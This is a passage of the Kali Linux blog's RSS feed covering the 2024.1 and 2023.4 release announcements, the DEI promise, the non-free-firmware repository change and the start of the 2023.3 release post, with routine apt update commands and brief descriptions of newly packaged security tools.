be on <a href="https://discord.com/servers/offsec-780824470113615893">OffSecs Discord</a>.</p> <ul> <li><a href="https://discord.gg/invite/offsec">Discord invite</a></li> <li><a href="./Kali-Discord-2024.1.ics">iCalendar invite</a></li> </ul> <p><em>Please note, we will not be making a recording of this event - its live only.</em></p> <hr> <h2 id="get-kali-linux-20241">Get Kali Linux 2024.1</h2> <p><strong>Fresh Images</strong>: So what are you waiting for? Go <a href="https://www.kali.org/get-kali/">get Kali</a> already!</p> <p>Seasoned Kali Linux users are already aware of this, but for the ones who are not, we do also produce <strong><a href="https://cdimage.kali.org/kali-images/kali-weekly/">weekly builds</a></strong> that you can use as well. If you cannot wait for our next release and you want the latest packages <em>(or bug fixes)</em> when you download the image, you can just use the weekly image instead. This way you will have fewer updates to do. <em>Just know that these are automated builds that we do not QA like we do our standard <a href="https://www.kali.org/releases/">release images</a></em>. But we gladly take <a href="https://bugs.kali.org/">bug reports</a> about those images because we want any issues to be fixed before our next release!</p> <p><strong>Existing Installs</strong>: If you already have an existing Kali Linux installation, remember you can always do a quick <a href="https://www.kali.org/docs/general-use/updating-kali/">update</a>:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware&quot; | sudo tee /etc/apt/sources.list [...] +--(kali?kali)-[~] +-$ sudo apt update &amp;&amp; sudo apt -y full-upgrade [...] +--(kali?kali)-[~] +-$ cp -vrbi /etc/skel/. ~/ [...] +--(kali?kali)-[~] +-$ [ -f /var/run/reboot-required ] &amp;&amp; sudo reboot -f </code></pre> <p>You should now be on Kali Linux 2024.1 We can do a quick check by doing:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ grep VERSION /etc/os-release VERSION=&quot;2024.1&quot; VERSION_ID=&quot;2024.1&quot; VERSION_CODENAME=&quot;kali-rolling&quot; +--(kali?kali)-[~] +-$ uname -v #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) +--(kali?kali)-[~] +-$ uname -r 6.6.9-amd64 </code></pre> <p><em>NOTE: The output of <code>uname -r</code> may be different depending on the system <a href="https://pkg.kali.org/pkg/linux">architecture</a>.</em></p> <p>As always, should you come across any bugs in Kali, please submit a report on our <a href="https://bugs.kali.org/">bug tracker</a>. <em>We will never be able to fix what we do not know is broken!</em> <strong>And Social networks are not bug trackers!</strong></p> <p>Want to keep in up-to-date easier? Automate it! We have a <a href="https://www.kali.org/rss.xml">RSS feeds</a> and <a href="https://www.kali.org/newsletter/">newsletter</a> of our <a href="https://www.kali.org/blog/">blog</a> to help you.</p></description>
</item>
<item>
<title>Kali Linux DEI Promise</title>
<link>https://www.kali.org/blog/dei-promise/</link>
<guid isPermaLink="true">https://www.kali.org/blog/dei-promise/</guid>
<pubDate>Mon, 29 Jan 2024 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/dei-promise/images/banner-dei.jpg" type="image/jpg"/>
<description><p>Last month we were privileged to be invited by GitLab to participate in the introduction of <a href="https://about.gitlab.com/blog/2024/01/29/building-a-more-inclusive-and-welcoming-open-source-community-on-gitlab/">GitLab&rsquo;s DEI Badging integration</a>. Diversity, Equity, and Inclusion <a href="https://badging.chaoss.community/project-badging">(DEI) badging</a> is an initiative that the <a href="https://chaoss.community/">Community Health Analytics in Open Source Software</a> (CHAOSS) project <a href="https://chaoss.community/chaoss-dei-project-badging/">created</a> to acknowledge and encourage open source projects&rsquo; efforts.</p> <p>Since we first heard of this initiative we have been very excited for the launch. Inclusion in the open source space has always been important and the cornerstone of what makes open source work. This sort of formalization of what inclusion means and how we execute on it is an important step forward in the maturation of open source projects in general. Kali Linux is an <a href="https://www.kali.org/docs/policy/kali-linux-open-source-policy/">open-source</a>, <a href="https://www.kali.org/docs/introduction/kali-linux-image-overview/">multi-platform</a>, distribution for all users, and with this effort we have the opportunity to make that explicit. We are also proud to say that we have already <a href="https://badging.chaoss.community/project-badging">received our badge</a>, as the first GitLab project to do so, aside from GitLab themselves of course!</p> <p>For our part in this initiative, we have published <a href="https://gitlab.com/kalilinux/documentation/governance/-/blob/main/DEI.md">our DEI.md statement file</a> and promise to continue working on this. We will be putting effort into increasing visibility of our operations in our <a href="https://gitlab.com/kalilinux">GitLab group</a>, availability of <a href="https://www.kali.org/docs/community/list-of-official-kali-sites/">resources</a>, documentation, and improving and increasing opportunities available for our <a href="https://www.kali.org/docs/community/">community</a> and <a href="https://www.kali.org/partnerships/">partners</a> to <a href="https://www.kali.org/docs/community/contribute/">contribute</a>. We are committed to working on this for years to come, and plan to continue to improve upon our work through feedback and thorough review.</p></description>
</item>
<item>
<title>The great non-free-firmware transition</title>
<link>https://www.kali.org/blog/non-free-firmware-transition/</link>
<guid isPermaLink="true">https://www.kali.org/blog/non-free-firmware-transition/</guid>
<pubDate>Mon, 22 Jan 2024 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/non-free-firmware-transition/images/banner-non-free-firmware.jpg" type="image/jpg"/>
<description><p>TL;DR: Dear Kali user, when you have a moment, check your <code>/etc/apt/sources.list</code>, and add <code>non-free-firmware</code> if ever it&rsquo;s missing.</p> <p>Programmatically speaking:</p> <pre><code class="language-console">kali@kali:~$ sudo sed -i 's/non-free$/non-free non-free-firmware/' /etc/apt/sources.list </code></pre> <hr> <p>Long story now.</p> <p>As you might know already, Kali Linux is a <a href="https://www.kali.org/docs/policy/kali-linux-relationship-with-debian/">Debian-based Linux distribution</a>. As such, it inherits a number of things from Debian, and in particular, the structure of the package repository.</p> <p>For anyone familiar with Kali, you already know that the package repository is split into different <em>archive areas</em> (also called <em>components</em>). Historically, there&rsquo;s always been 3 components: <a href="https://http.kali.org/kali/dists/kali-rolling/"><code>main</code>, <code>contrib</code> and <code>non-free</code></a>. However, this changed last year, when <a href="https://www.debian.org/releases/bookworm/amd64/release-notes/ch-whats-new.en.html#archive-areas">Debian introduced a new component called <code>non-free-firmware</code></a>.</p> <p>Kali Linux followed suite, and introduced the <code>non-free-firmware</code> component back in version <a href="https://www.kali.org/blog/kali-linux-2023-1-release/">2023.1</a>. However, so far it&rsquo;s been empty, and firmware were still part of the <code>non-free</code> component. This changed last week: firmware are now located in the <code>non-free-firmware</code> component. In practice, it means that <em>non-free-firmware must be enabled in your /etc/apt/sources.list</em>, otherwise firmware would not get updated when you run your favorite command <code>apt update &amp;&amp; apt full-upgrade</code>.</p> <p>For anyone who installed Kali post 2023.1, <code>non-free-firmware</code> is already enabled in your <code>sources.list</code>. But it does not hurt to check, so here&rsquo;s how it should look like:</p> <pre><code class="language-console">kali@kali:~$ cat /etc/apt/sources.list deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware </code></pre> <p>If ever <code>non-free-firmware</code> is missing, please edit the file <code>/etc/apt/sources.list</code> to add it. Or, just do it with this one-liner:</p> <pre><code class="language-console">kali@kali:~$ sudo sed -i 's/non-free$/non-free non-free-firmware/' /etc/apt/sources.list </code></pre> <p>Then complete the job with the traditional <code>sudo apt update</code>. No error? You&rsquo;re done.</p> <p>Thanks for your attention!</p></description>
</item>
<item>
<title>Kali Linux 2023.4 Release (Cloud ARM64, Vagrant Hyper-V & Raspberry Pi 5)</title>
<link>https://www.kali.org/blog/kali-linux-2023-4-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2023-4-release/</guid>
<pubDate>Tue, 05 Dec 2023 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/kali-linux-2023-4-release/images/banner-2023.4-release.jpg" type="image/jpg"/>
<description><p>With 2023 coming to an end and before the holiday season starts, we thought today would be a good time to <a href="https://www.kali.org/releases/">release</a> <strong>Kali 2023.4</strong>. Whilst this release may not have the most end-user features in it again, there are a number of new platform offerings and there has still been a lot of changes going on behind-the-scenes for us, which has a positive knock-on effect resulting in a benefit for everyone. News, platforms, and features aside, it would not be a Kali release if there was not a number of changes to our packages - both new tools and upgrades to existing ones. If you want to see what is new for yourself <a href="https://www.kali.org/get-kali/">download</a> a new image or <a href="https://www.kali.org/docs/general-use/updating-kali/">upgrade <em>if you already have a Kali Linux installation</em></a>.</p> <p>The summary of the <a href="https://bugs.kali.org/changelog_page.php">changelog</a> since the <a href="https://www.kali.org/blog/kali-linux-2023-3-release/">2023.3 release from August</a> is:</p> <ul> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-4-release/#cloud-arm-marketplaces">Cloud ARM64</a></strong> - Now Amazon AWS and Microsoft Azure marketplaces have an ARM64 option</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-4-release/#vagrant-hyper-v-support">Vagrant Hyper-V</a></strong> - Our Vagrant offering now supports Hyper-V</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-4-release/#raspberry-pi-5">Raspberry Pi 5</a></strong> - Kali on the latest Raspberry Pi foundation device</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-4-release/#gnome-45">GNOME 45</a></strong> - Kali theme is on the latest versions</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-4-release/#internal-infrastructure">Internal Infrastructure</a></strong> - Peak at what is going on behind the scenes with mirrorbits</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-4-release/#new-tools-in-kali">New Tools</a></strong> - As always, various new &amp; updated packages</li> </ul> <hr> <h2 id="cloud-arm64-marketplaces">Cloud ARM64 Marketplaces</h2> <p>Starting from Kali 2023.4, we will now be offering both Kali Linux AMD64 and ARM64 on <a href="https://aws.amazon.com/marketplace/seller-profile?id=3fd16b5c-a3f6-43b5-b254-0a6ae8f6a350">Amazon AWS</a> and <a href="https://azuremarketplace.microsoft.com/en/marketplace/apps/kali-linux.kali?tab=overview">Microsoft Azure</a> marketplaces.</p> <p>The advantage that ARM64 brings to the table is more options and flexibility in instance offerings, which leads to improved price-to-performance ratio. The draw back is, even though Kali Linux has always treated ARM a first class citizen, not every package has an ARM64 offering - most do and we are working on improving this every day! Try setting up a lab in the cloud and performing your own benchmarks to compare performances.</p> <p><strong>Amazon AWS</strong>:</p> <ul> <li><a href="https://aws.amazon.com/marketplace/pp/prodview-fznsw3f7mq7to">Kali Linux (AMD64)</a></li> <li><a href="https://aws.amazon.com/marketplace/pp/prodview-kie6xvt5r3spi">Kali Linux (ARM64)</a></li> </ul> <hr> <p><strong>Microsoft Azure</strong>:</p> <ul> <li><a href="https://azuremarketplace.microsoft.com/en/marketplace/apps/kali-linux.kali?tab=overview">Kali Linux</a></li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-4-release/images/kali-azure-arm64.png'> <img src="https://www.kali.org/blog/kali-linux-2023-4-release/images/kali-azure-arm64.png" alt="Kali Azure ARM64" /> </a> </p> </p> <p>If you need some help using Kali Linux in the cloud, be sure to check our <a href="https://www.kali.org/docs/cloud/">documentation</a>. Otherwise, if you want to see how we generate these images, see our <a href="https://gitlab.com/kalilinux/build-scripts/kali-cloud">cloud build-scripts</a>.</p> <h2 id="vagrant-hyper-v-support">Vagrant Hyper-V Support</h2> <p>With <a href="https://www.kali.org/blog/kali-linux-2023-2-release/#new-hyper-v-vm-image">our recent work</a> with adding support to our <a href="https://gitlab.com/kalilinux/build-scripts/kali-vm">VM build-scripts</a> to create Microsoft Hyper-V virtual machines, we have kept on going down the rabbit hole of development. <a href="https://app.vagrantup.com/kalilinux/boxes/rolling">Our Vagrant offering</a> now includes a Hyper-V environment!</p> <p>If you are not too familiar with Vagrant, think of it as a command-line interface for VMware, VirtualBox, and now Hyper-V.</p> <p>At a higher level, in the same way that Docker uses <code>Dockerfile</code>, Vagrant uses <code>Vagrantfile</code>. These files go on to define how to create the virtual machine and further provisions, such as which operating system to use, CPU, RAM, storage, networking, and also any scripts or commands that the VM should execute to further install and configure.</p> <p>That means our <a href="https://app.vagrantup.com/kalilinux/boxes/rolling">our Vagrant offering</a> has support for:</p> <ul> <li>Hyper-V</li> <li>QEMU</li> <li>VirtualBox</li> <li>VMware</li> </ul> <p>If this is something you like the sound of, we have further reading on our documentation:</p> <ul> <li><a href="https://www.kali.org/docs/virtualization/customizing-kali-vagrant/">Customizing a Kali Vagrant Vagrantfile</a></li> <li><a href="https://www.kali.org/docs/virtualization/install-vagrant-guest-vm/">Kali inside Vagrant (Guest VM)</a></li> </ul> <p>We also have our <a href="https://gitlab.com/kalilinux/build-scripts/kali-vagrant">vagrant build-scripts</a> public if you want to see how it is done.</p> <h2 id="raspberry-pi-5">Raspberry Pi 5</h2> <p>If you have been lucky enough to get your hands on the newest Raspberry Pi, Kali Linux can now be used on a Raspberry Pi 5!</p> <p>We have created a new dedicated image which can either be <a href="https://www.kali.org/get-kali/#kali-arm">downloaded direct</a>, or automated using <a href="https://www.kali.org/docs/arm/using-rpi-imager-to-write-raspberry-pi-images/">Raspberry Pi Imager</a>.</p> <p>You can <a href="https://gitlab.com/kalilinux/build-scripts/kali-arm">build the image yourself</a> if you wish to tinker and customize any aspect of it, such as changing the default desktop environment, packages, settings etc.</p> <p>Please note, Nexmon support is not yet working with the in-built Wi-Fi (so no monitor mode or frame injection without an external card).</p> <p>You can keep an eye on progress by checking our <a href="https://www.kali.org/docs/arm/raspberry-pi-5/">documentation</a> about it. Please keep in mind that while the image is now available for use, we would consider it to be in a BETA state. For the time being, the image is for ARM64 architecture, hopefully additional flavors will come later.</p> <p>We want to give a huge shout-out as there were a lot of volunteers from the community who were willing to test and report issues with the image. There was one person who really stood out, and this image would not be possible without <code>BakaValen</code>&rsquo;s assistance, support, reporting of issues, and ideas.</p> <p>Additionally, David Bombal&rsquo;s <a href="https://youtube.com/watch?v=paN5F1EmjfA">Raspberry Pi 5 Kali Linux install in 10 minutes</a> came out to show off our initial work of Kali Linux on the Raspberry Pi 5.</p> <h2 id="gnome-45">GNOME 45</h2> <p>With <strong>GNOME 45</strong> hot off the press, Kali Linux is now supporting it! And is looking pretty in the process!</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-4-release/images/gnome-45.png'> <img src="https://www.kali.org/blog/kali-linux-2023-4-release/images/gnome-45.png" alt="Kali GNOME 45" /> </a> </p> </p> <p>For people who opt to use GNOME as their desktop environment, <strong><a href="https://release.gnome.org/45/">GNOME 45</a></strong> is now here! If you do not read their changelog, below is a quick summary mixed with some of our tweaks:</p> <ul> <li>Full-height sidebars in many updated apps</li> <li>Highly <strong>improved speed of search in nautilus file manager</strong> <ul> <li>Unfortunately the update for <code>nautilus</code> was not ready for this release, but it will arrive as a later update soon</li> </ul> </li> <li><strong>Improved settings</strong> app (<code>gnome-control-center</code>)</li> <li><strong>Updated color-schemes</strong> for <code>gnome-text-editor</code></li> <li><strong>Updated themes</strong> for <code>shell</code>, <code>libadwaita</code>, <code>gtk-3</code> and <code>gtk-4</code></li> <li><strong>Updated <code>gnome-shell</code> extensions</strong></li> <li>Shell updates, including a new <strong>workspace indicator</strong>, replacing the previous &ldquo;Activities&rdquo; button <ul> <li>It is also possible to scroll your mouse wheel while hovering over the indicator to switch between workspaces</li> </ul> </li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-4-release/images/gnome-45-activities-indicator.gif'> <img src="https://www.kali.org/blog/kali-linux-2023-4-release/images/gnome-45-activities-indicator.gif" alt="GNOME 45 activities indicator" /> </a> </p> </p> <h2 id="internal-infrastructure">Internal Infrastructure</h2> <p>We are still undergoing big changes with our infrastructure, and as always, it is taking longer than planned! The wait has been worth it, and long standing items are getting fixed or replaced!</p> <h3 id="enters-mirrorbits">Enters Mirrorbits</h3> <p>One of the projects which is now complete is the migration of our &ldquo;mirror redirector&rdquo;. This is our biggest user-facing service, as without this, all default Kali installations would not be able to use <code>apt</code> (aka <code>http.kali.org</code>), or being able to download Kali image (<code>cdimage.kali.org</code>). This service sits in-front of our mirrors (<code>archive*.kali.org</code>), <a href="https://http.kali.org/README?mirrorlist">community mirrors</a> and Cloudflare (<code>kali.download</code>). It is responsible for redirecting every request to its nearest mirror, based on a few factors such as geographic location, mirror speed, and <a href="https://mirror-traces.kali.org/">mirror &ldquo;freshness&rdquo;</a>.</p> <p>Since Kali was launched back in March 2013, until November 2023 we had been using <a href="https://mirrorbrain.org/">MirrorBrain</a>. Unfortunately, the project has been unmaintained since 2015, and so after 10 years in production, it was really time to say good-bye. Today, we are now using <a href="https://github.com/etix/mirrorbits">Mirrorbits</a>.</p> <p>The first thing we can say is that, with Mirrorbits, we find ourselves lucky: this is a rock-solid piece of software, built on modern tech (Go and Redis), initially released 10 years ago, and running in production for just as long. It was initially developed by <a href="https://blog.l0cal.com/">Ludovic Fauvet</a> from VideoLAN in order to distribute the VLC media player. And over these years, it has been adopted by a growing number of FOSS projects such as GNOME, Jenkins, Lineage OS, and many others. </p> <p>As it happens, our use-case of Mirrorbits is different to what it was originally created for: distributing VLC, or in other words, a rather small set of static files. Kali Linux being a <em>complete Linux distribution</em>, it means that we distribute a huge number of files (at times there can be millions of files in our repo). Being a <em>rolling distribution</em> means that Mirrorbits must cope with fast-changing metadata in the repository. We also need to distribute Kali over both HTTP and HTTPS, which was not well supported.</p> <p>Thus, the transition to Mirrorbits was not trivial, it did not work &ldquo;out-of-the-box&rdquo; for us, and we had to rework some pieces here and there, and basically hammer at it until it does the job. But it was well worth it, and in the end our modifications were clean enough that we could submit it all <a href="https://github.com/etix/mirrorbits">upstream</a>. We really hope that all of this work will be accepted, thus making it easier for Linux distributions in general to use Mirrorbits going forward. Oh, and we have created and are maintaining the <a href="https://tracker.debian.org/pkg/mirrorbits">Debian package</a>!</p> <p>Much more could be written on the topic, and we plan a longer blog post dedicated to it. But for now, enough&rsquo;s been said.</p> <h2 id="new-tools-in-kali">New Tools in Kali</h2> <p>It would not be a Kali release if there were not any new tools added! A quick run down of what has been added <em>(to the network repositories)</em>:</p> <ul> <li><a href="https://pkg.kali.org/pkg/cabby">cabby</a> - TAXII client implementation</li> <li><a href="https://pkg.kali.org/pkg/cti-taxii-client">cti-taxii-client</a> - TAXII 2 client library</li> <li><a href="https://www.kali.org/tools/enum4linux-ng/">enum4linux-ng</a> - Next generation version of enum4linux with additional features (a Windows/Samba enumeration tool)</li> <li><a href="https://www.kali.org/tools/exiflooter/">exiflooter</a> - Finds geolocation on all image URLs and directories</li> <li><a href="https://www.kali.org/tools/h8mail/">h8mail</a> - Email OSINT &amp; Password breach hunting tool</li> <li><a href="https://www.kali.org/tools/havoc/">Havoc</a> - Modern and malleable post-exploitation command and control framework</li> <li><a href="https://pkg.kali.org/pkg/opentaxii">OpenTAXII</a> - TAXII server implementation </li> <li><a href="https://www.kali.org/tools/passdetective/">PassDetective</a> - Scans shell command history to detect mistakenly written passwords, API keys, and secrets</li> <li><a href="https://www.kali.org/tools/portspoof/">Portspoof</a> - All 65535 TCP ports are always open &amp; emulates services</li> <li><a href="https://www.kali.org/tools/raven/">Raven</a> - Lightweight HTTP file upload service</li> <li><a href="https://www.kali.org/tools/reconspider/">ReconSpider</a> - Most Advanced Open Source Intelligence (OSINT) Framework</li> <li><a href="https://www.kali.org/tools/rling/">rling</a> - RLI Next Gen (Rling), a faster multi-threaded, feature rich alternative to rli</li> <li><a href="https://www.kali.org/tools/sigma-cli/">Sigma-Cli</a> - List and convert Sigma rules into query languages</li> <li><a href="https://www.kali.org/tools/sn0int/">sn0int</a> - Semi-automatic OSINT framework and package manager</li> <li><a href="https://www.kali.org/tools/spire/">SPIRE</a> - SPIFFE Runtime Environment is a toolchain of APIs for establishing trust between software systems</li> </ul> <p><em>There have also been numerous packages updates and new libraries as well. We also bump the Kali kernel to 6.5.0!</em></p> <h3 id="community-packages">Community Packages</h3> <p>There have been multiple tools submitted from the community, ready to be merged into Kali:</p> <ul> <li><a href="https://www.kali.org/tools/h8mail/">h8mail</a> - Credit to: <a href="https://github.com/5nacks">Jason &ldquo;5nacks&rdquo; Kregting</a> &amp; <a href="https://github.com/tracelabs">TraceLabs</a></li> <li><a href="https://www.kali.org/tools/passdetective/">PassDetective</a> - Credit to: <a href="https://gitlab.com/yunusaydin0">Yunus &ldquo;aydinnyunus&rdquo; AYDIN</a></li> <li><a href="https://www.kali.org/tools/sn0int/">sn0int</a> - Credit to: <a href="https://vulns.xyz/">kpcyrd</a></li> </ul> <p>For more information about this, please see <a href="https://www.kali.org/blog/kali-linux-2023-3-release/#rekono---community-package-submission">our blog post from previous release</a>.</p> <h2 id="miscellaneous">Miscellaneous</h2> <p>Below are a few other things which have been updated in Kali, which we are calling out which do not have as much detail on:</p> <ul> <li>We have changed <a href="https://www.kali.org/newsletter/">our newsletter</a> provider to SubStack! <ul> <li>If you want our blog posts, and only that in your inbox, sign up!</li> </ul> </li> <li>We have seen an <a href="https://github.com/vmware/open-vm-tools/issues/696">issue with VMware currently (VMware workstation 17.5), where it appears input (keyboard/mouse) will freeze</a> after a period of time <ul> <li>Check the above link for a workaround solution</li> <li>If you use <a href="https://www.kali.org/get-kali/#kali-virtual-machines">our pre-generated VMs</a>, the patch has already been applied</li> </ul> </li> <li>There also appears to be an issue with KDE inside a virtual machine, where certain functions between host/guest are not working, such as shared clipboard (copy/paste)</li> <li>We have added support for QT6 themes</li> <li>A friendly reminder about <a href="https://www.kali.org/blog/python-externally-managed/">Python v3.12 PIP install change which will alter &ldquo;soon&rdquo;</a></li> </ul> <h2 id="kali-nethunter-updates">Kali NetHunter Updates</h2> <p>We have seen a few things from the community worth calling out:</p> <ul> <li><a href="https://twitter.com/yesimxev/status/1725792218512847358">Doom on @kalilinux NetHunter TicWatch Pro 3</a></li> <li><a href="https://www.youtube.com/watch?v=GmfM8VCAu-I">Kali Linux NetHunter install in 8 minutes (rootless) and includes Android 14</a> </li> <li><a href="https://odysee.com/@z2rec:1/how-i-ported-kali-nethunter-to-unsupported-device:c">How I Ported Kali NetHunter to Unsupported Device - Essential Phone</a></li> </ul> <h2 id="kali-arm-updates">Kali ARM Updates</h2> <p>There are not a lot of changes to the ARM images this release, aside from the previously mentioned Raspberry Pi 5 support. However, they are no less important.</p> <ul> <li>The Raspberry Pi Zero W image now properly starts up into the command line interface instead of launching X.</li> <li>Accessing network configuration remotely now properly works again.</li> <li><em><a href="https://www.kali.org/tools/eyewitness/">eyewitness</a> is now available for ARM64 platform.</em> </li> </ul> <h2 id="kali-website-updates">Kali Website Updates</h2> <p>We have recently created a <a href="https://www.kali.org/faq/">Frequently Asked Questions</a> with answers that we commonly keep seeing crop up.</p> <hr> <p>Our <a href="https://www.kali.org/docs/">Kali documentation</a> has had various updates to existing pages as well as new pages:</p> <ul> <li><a href="https://www.kali.org/docs/nethunter/nethunter-kernel-8-config-7/">Configuring the Kernel - NFS</a> <em>(new)</em></li> <li><a href="https://www.kali.org/docs/installation/installation-sizes/">Kali Installation Sizes</a> <em>(new)</em></li> <li><a href="https://www.kali.org/docs/arm/raspberry-pi-5/">Raspberry Pi 5</a> <em>(new)</em></li> <li><a href="https://www.kali.org/docs/arm/raspberry-pi-zero-w-pi-tail/">Raspberry Pi-Tail Zero W</a> <em>(updated)</em></li> </ul> <p>We also want to say a little thank you to following for their work on the sites:</p> <ul> <li><a href="https://gitlab.com/dverbenyi">David Verbenyi</a></li> <li><a href="https://gitlab.com/Hegezcc">Heikki Miinalainen</a></li> <li><a href="https://gitlab.com/matusb42">Brian Matus</a></li> <li><a href="https://gitlab.com/X0RW3LL">X0RW3LL</a></li> <li><a href="https://gitlab.com/yesimxev">yesimxev</a></li> </ul> <h2 id="community-shout-outs">Community Shout-Outs</h2> <p>These are <strong>people from the public who have helped Kali</strong> and the team for the last release. And we want to praise them for their work <em>(we like to give credit where due!)</em>:</p> <ul> <li><a href="https://gitlab.com/aiprogram.v32">AI Program</a> - Helped testing base images</li> <li>BakaValen - Helped with testing, troubleshooting and offering ideas with the Raspberry Pi 5 image</li> <li><a href="https://www.youtube.com/@davidbombal">David Bombal</a> - Helped with testing the Raspberry Pi 5 image</li> <li><a href="https://gitlab.com/Salty_">Salty</a> - Helped with testing base images</li> <li><a href="https://gitlab.com/X0RW3LL">X0RW3LL</a> - Helped with testing base images</li> </ul> <p>Anyone can help out, anyone can get <a href="https://www.kali.org/docs/community/contribute/">involved</a>!</p> <h3 id="new-kali-mirrors">New Kali Mirrors</h3> <p>We have some new mirrors! Those are:</p> <ul> <li>Japan: <a href="http://repo.jing.rocks/kali">repo.jing.rocks</a>. Thanks to Jing Luo for reaching out and hosting this mirror!</li> <li>Serbia: <a href="http://mirror1.sox.rs/kali">mirror1.sox.rs</a> sponsored by SOX, the <a href="https://www.sox.rs/en/">Serbian Open eXchange</a>. Thanks to Sasa Ristic for reaching out to us!</li> </ul> <p>If you have the disk space and bandwidth, <a href="https://www.kali.org/docs/community/setting-up-a-kali-linux-mirror/">we always welcome new mirrors</a>.</p> <hr> <h2 id="kali-team-discord-chat">Kali Team Discord Chat</h2> <p>Once the Kali release is over, we have been doing an hour long voice chat with a number of Kali team members. This is where anyone can ask questions to us about Kali or the information security industry as a whole.</p> <p>The next session will be held slightly differently to our previous ones, later in the day, on the Friday that is coming up, and on <a href="https://discord.com/servers/offsec-780824470113615893">OffSec&rsquo;s Discord</a> - <strong>Friday, 8th December 2023 18:00 -&gt; 19:00 <a href="https://time.is/UTC">UTC/+0 GMT</a></strong> (<a href="https://discord.gg/invite/offsec">Discord</a> link &amp; <a href="./Kali-Discord-2023.4.ics">iCalendar</a> invite).</p> <p><em>Please note, there will not be a recording of this - its live only.</em></p> <hr> <h2 id="get-kali-linux-20234">Get Kali Linux 2023.4</h2> <p><strong>Fresh Images</strong>: So what are you waiting for? Go and <a href="https://www.kali.org/get-kali/">grab Kali</a> already!</p> <p>Seasoned Kali Linux users are already aware of this, but for the ones who are not, we do also have <strong><a href="https://cdimage.kali.org/kali-images/kali-weekly/">weekly builds</a></strong> that you can use as well. If you cannot wait for our next release next quarter to get the latest packages <em>or bug fixes</em> you can download these images instead. <em>Just know that these are automated builds that we do not QA like we do our standard <a href="https://www.kali.org/releases/">point release images</a></em>. We also welcome any <a href="https://bugs.kali.org/">bug reports</a> about those images too!!</p> <p><strong>Existing Installs</strong>: If you already have an existing Kali Linux installation, remember you can always do a quick <a href="https://www.kali.org/docs/general-use/updating-kali/">update</a>:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware&quot; | sudo tee /etc/apt/sources.list [...] +--(kali?kali)-[~] +-$ sudo apt update &amp;&amp; sudo apt -y full-upgrade [...] +--(kali?kali)-[~] +-$ cp -vrbi /etc/skel/. ~/ [...] +--(kali?kali)-[~] +-$ [ -f /var/run/reboot-required ] &amp;&amp; sudo reboot -f </code></pre> <p>You should now be on Kali Linux 2023.4! We can do a quick check by doing:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ grep VERSION /etc/os-release VERSION=&quot;2023.4&quot; VERSION_ID=&quot;2023.4&quot; VERSION_CODENAME=&quot;kali-rolling&quot; +--(kali?kali)-[~] +-$ uname -v #1 SMP PREEMPT_DYNAMIC Debian 6.5.6-1kali1 (2023-10-09) +--(kali?kali)-[~] +-$ uname -r 6.5.0-kali3-amd64 </code></pre> <p><em>NOTE: The output of <code>uname -r</code> may be different depending on the system <a href="https://pkg.kali.org/pkg/linux">architecture</a>.</em></p> <p>As always, should you discover any issues with Kali, please search then submit a report on our <a href="https://bugs.kali.org/">bug tracker</a>. <em>We will never be able to fix what we do not know is broken!</em> <strong>And social networks are not bug trackers!</strong></p> <p>Want to keep up-to-date? Easy! We have a <a href="https://www.kali.org/rss.xml">RSS feeds</a> and <a href="https://www.kali.org/newsletter/">newsletter</a> of our <a href="https://www.kali.org/blog/">blog</a> to help you. <em>Our social networks are in the footer of this page!</em></p></description>
</item>
<item>
<title>Kali Linux 2023.3 Release (Internal Infrastructure & Kali Autopilot)</title>
<link>https://www.kali.org/blog/kali-linux-2023-3-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2023-3-release/</guid>
<pubDate>Wed, 23 Aug 2023 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/kali-linux-2023-3-release/images/banner-2023.3-release.jpg" type="image/jpg"/>
<description><p>Today we are delighted to introduce our latest <a href="https://www.kali.org/releases/">release of Kali</a>, 2023.3. This release blog post does not have the most features in it, as a lot of the changes have been behind-the-scenes, which brings a huge benefit to us and an indirect positive effect to you as end-users. It always goes without saying, but there are a number of new packages and tools as well as the standard updates. If you want to see what&rsquo;s new for yourself <a href="https://www.kali.org/get-kali/">download</a> or <a href="https://www.kali.org/docs/general-use/updating-kali/">upgrade <em>if you have an existing Kali Linux installation</em></a>.</p> <p>The highlights of the <a href="https://bugs.kali.org/changelog_page.php">changelog</a> since the <a href="https://www.kali.org/blog/kali-linux-2023-2-release/">2023.2 release from May</a>:</p> <ul> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-3-release/#internal-infrastructure">Internal Infrastructure</a></strong> - Major stack changes is under way</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-3-release/#kali-autopilot">Kali Autopilot</a></strong> - The automation attack framework has had an major overhaul</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-3-release/#new-tools-in-kali">New Tools</a></strong> - 9 new tools added this time round!</li> </ul> <hr> <h2 id="internal-infrastructure">Internal Infrastructure</h2> <p>With the release of Debian 12 which came out this summer, we took this opportunity to re-work, re-design, and re-architecture our infrastructure. It is as massive as it sounds, and should not be a surprise that its not yet complete! This is where a good amount of our focus has been for this release-cycle (and also the next one unfortunately). We are hoping that the majority of it will be done by the end of the year (so we can get back to what we do best!)</p> <p>This gives an excuse and the motivation to simplify our software stack as much as possible. Example, using one single:</p> <ul> <li>OS version (Debian 12)</li> <li>CDN/WAF (Cloudflare)</li> <li>Web server service (Nginx)</li> <li>Infrastructure as Code 